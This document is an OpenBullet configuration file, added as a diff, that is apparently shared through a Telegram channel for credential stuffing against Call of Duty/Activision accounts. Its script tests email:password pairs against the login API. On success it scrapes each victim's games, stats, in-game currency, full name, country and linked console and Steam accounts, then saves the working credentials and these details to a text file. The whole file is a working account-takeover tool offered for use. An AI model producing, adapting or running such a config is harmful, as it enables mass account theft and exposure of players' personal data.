@@ -1,0 +1,200 @@
+[SETTINGS]
+{
+  "Name": "Cod Public",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-23T21:04:43.3681146+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Rnd FUNCTION RandomString "?d?d?l?d?d?d?d?l?l?l?d?l?d?d?l?d" -> VAR "Rnd" 
+
+#Post REQUEST POST "https://profile.callofduty.com/cod/mapp/registerDevice" 
+  CONTENT "{\"deviceId\":\"<Rnd>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: profile.callofduty.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Connection: close" 
+
+#Hash PARSE "<SOURCE>" JSON "authHeader" -> VAR "Hash" 
+
+#Login REQUEST POST "https://profile.callofduty.com/cod/mapp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: profile.callofduty.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: bearer <Hash>" 
+  HEADER "X_cod_device_id: <Rnd>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.1" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "rtkn\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"gameAccountLinked\":false,\"success\":false}" 
+
+#Get REQUEST GET "https://my.callofduty.com/api/papi-client/crm/cod/v2/identities/<COOKIES(ACT_SSO_COOKIE)>" 
+  
+  HEADER "Host: my.callofduty.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://my.callofduty.com/login" 
+
+#game PARSE "<SOURCE>" LR "title\":\"" "\"" Recursive=TRUE -> VAR "game" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "title\":\"" 
+
+#Games FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "bo4" VALUE "BLACK OPS4" 
+  KEY "mw" VALUE "MODERN WARFARE" 
+  KEY "cw" VALUE "BLACK OPS COLD WAR" 
+  KEY "wwii" VALUE "WWII" 
+  "<game>" -> CAP "Games" 
+
+#platforms PARSE "<SOURCE>" LR "platform\":\"" "\"" Recursive=TRUE -> VAR "platforms" 
+
+#platform PARSE "<SOURCE>" LR "platform\":\"" "\"" -> VAR "platform" 
+
+#Platforms FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "xbl" VALUE "XBOX" 
+  KEY "battle" VALUE "BLLIZARD" 
+  "<platforms>" -> CAP "Platforms" 
+
+#Username PARSE "<SOURCE>" LR "username\":\"" "\"" -> VAR "Username" 
+
+#Encode_Username FUNCTION URLEncode "<Username>" -> VAR "Encode Username" 
+
+#Get REQUEST GET "https://my.callofduty.com/api/papi-client/stats/cod/v1/title/mw/platform/<platform>/gamer/<Encode Username>/profile/type/mp" 
+  
+  HEADER "Host: my.callofduty.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://my.callofduty.com/login" 
+
+#Level PARSE "<SOURCE>" LR "\"level\":" "," CreateEmpty=FALSE -> CAP "Level" 
+
+#Wins PARSE "<SOURCE>" LR "\"wins\":" "," CreateEmpty=FALSE -> CAP "Wins" 
+
+#Kills PARSE "<SOURCE>" LR "\"kills\":" "," CreateEmpty=FALSE -> CAP "Kills" 
+
+#Get REQUEST GET "https://my.callofduty.com/api/papi-client/inventory/v1/title/cw/platform/<platform>/gamer/<Encode Username>/currency" 
+  
+  HEADER "Host: my.callofduty.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://my.callofduty.com/dashboard" 
+
+#CP_|codPoints| PARSE "<SOURCE>" LR "codPoints\":" "}" CreateEmpty=FALSE -> CAP "CP |codPoints|" 
+
+#Get REQUEST GET "https://profile.callofduty.com/cod/profile" 
+  
+  HEADER "Host: profile.callofduty.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://my.callofduty.com/dashboard" 
+
+#Full_Name PARSE "<SOURCE>" LR "<p class=\"personalInfoDisplay\">" "</p>" CreateEmpty=FALSE -> CAP "Full Name" 
+
+#Activision_ID PARSE "<SOURCE>" LR "<span class=\"forum-name\">" "</span>" CreateEmpty=FALSE -> CAP "Activision ID" 
+
+#country PARSE "<SOURCE>" LR "<span class=\"country\">" "</span>" -> VAR "country" 
+
+#Country FUNCTION Replace "<span class=\"country\">" "" "<country>" -> CAP "Country" 
+
+#L1 PARSE "<SOURCE>" LR "Playstation Account: " "</span>" -> VAR "L1" 
+
+#L2 PARSE "<SOURCE>" LR "Battle.net Account: " "</span>" -> VAR "L2" 
+
+#L3 PARSE "<SOURCE>" LR "XBOX Live Account: " "</span>" -> VAR "L3" 
+
+#L4 PARSE "<SOURCE>" LR "Steam Account: " "</span>" -> VAR "L4" 
+
+IF "<L1>" EqualTo ""
+SET CAP "Playstation Linked" "Not Linked"
+ELSE
+SET CAP "Playstation Linked" "Linked |ID:<L1>|"
+ENDIF
+IF "<L2>" EqualTo ""
+SET CAP "Bllizard Linked" "Not Linked"
+ELSE
+SET CAP "Bllizard Linked" "Linked |ID:<L2>|"
+ENDIF
+IF "<L3>" EqualTo ""
+SET CAP "XBOX Linked" "Not Linked"
+ELSE
+SET CAP "XBOX Linked" "Linked |ID:<L3>|"
+ENDIF
+IF "<L4>" EqualTo ""
+SET CAP "Steam Linked" "Not Linked"
+ELSE
+SET CAP "Steam Linked" "Linked |ID:<L4>|"
+ENDIF
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "CALL OF DUTY.txt" Append "<USER>:<PASS>\\nGames:<Games>\\nPlatforms:<Platforms>\\nLevel:<Level>\\nWins:<Wins>\\nKills:<Kills>\\nCP |codPoints|:<CP |codPoints|>\\nFull Name:<Full Name>\\nActivision ID:<Activision ID>\\nCountry:<Country>\\nPlaystation Linked:<Playstation Linked>\\nBllizard Linked:<Bllizard Linked>\\nXBOX Linked:<XBOX Linked>\\nSteam Linked:<Steam Linked>\\nTelegram Channel:@OpenBulletChannel\\n--------------------------------------------------------\\n" -> VAR "Save" 
+
